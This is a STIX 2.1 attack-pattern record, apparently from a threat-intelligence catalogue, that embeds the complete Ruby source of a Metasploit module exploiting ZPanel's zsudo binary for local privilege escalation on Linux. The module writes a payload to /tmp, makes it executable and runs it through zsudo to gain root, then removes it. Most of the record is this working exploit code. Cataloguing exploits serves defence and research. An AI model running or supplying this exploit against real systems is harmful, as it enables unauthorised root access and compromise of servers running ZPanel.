{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04953e57-d71e-42bd-ad43-4d6708e36337",
    "created": "2024-08-14T16:58:36.76475Z",
    "modified": "2024-08-14T16:58:36.764754Z",
    "name": "ZPanel zsudo Local Privilege Escalation Exploit",
    "description": " This module abuses the zsudo binary, installed with zpanel, to escalate privileges. In order to work, a session with access to zsudo on the sudoers configuration is needed. This module is useful for post exploitation of ZPanel vulnerabilities, where typically web server privileges are acquired, and this user is allowed to execute zsudo on the sudoers file.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/zpanel_zsudo.rb",
            "external_id": "zpanel_zsudo.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'ZPanel zsudo Local Privilege Escalation Exploit',\n        'Description'   => %q{\n          This module abuses the zsudo binary, installed with zpanel, to escalate\n          privileges. In order to work, a session with access to zsudo on the sudoers\n          configuration is needed. This module is useful for post exploitation of ZPanel\n          vulnerabilities, where typically web server privileges are acquired, and this\n          user is allowed to execute zsudo on the sudoers file.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        => [ 'sinn3r', 'juan vazquez' ],\n        'DisclosureDate' => '2013-06-07',\n        'Platform'      => %w{ linux unix },\n        'Arch'          => [ ARCH_CMD, ARCH_X86 ],\n        'SessionTypes'  => [ 'shell', 'meterpreter' ],\n        'Targets'       =>\n          [\n            [ 'Command payload', { 'Arch' => ARCH_CMD } ],\n            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ]\n          ],\n        'DefaultOptions' => { \"PrependSetresuid\" => true, \"WfsDelay\" => 2 },\n        'DefaultTarget' => 0,\n      }\n      ))\n    register_options [\n      OptString.new(\"zsudo\", [ true, \"Path to zsudo executable\", \"/etc/zpanel/panel/bin/zsudo\" ])\n    ]\n    register_advanced_options [\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ])\n    ]\n  end\n\n  def check\n    if file?(datastore[\"zsudo\"])\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Safe\n  end\n\n  def exploit\n    if (target.arch.include? ARCH_CMD)\n      exe_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(3 + rand(5))}.sh\"\n      # Using this way of writing the payload to avoid issues when failing to find\n      # a command on the victim for writing binary data\n      cmd_exec \"echo \\\"#{payload.encoded.gsub(/\"/, \"\\\\\\\"\")}\\\" > #{exe_file}\"\n    else\n      exe_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(3 + rand(5))}.elf\"\n      write_file(exe_file, generate_payload_exe)\n    end\n\n    cmd_exec \"chmod +x #{exe_file}\"\n\n    print_status(\"Running...\")\n\n    begin\n      cmd_exec \"#{datastore[\"zsudo\"]} #{exe_file} #{rand_text_alpha(3 + rand(5))}\"\n    ensure\n      cmd_exec \"rm -f #{exe_file}\"\n    end\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-06-07",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}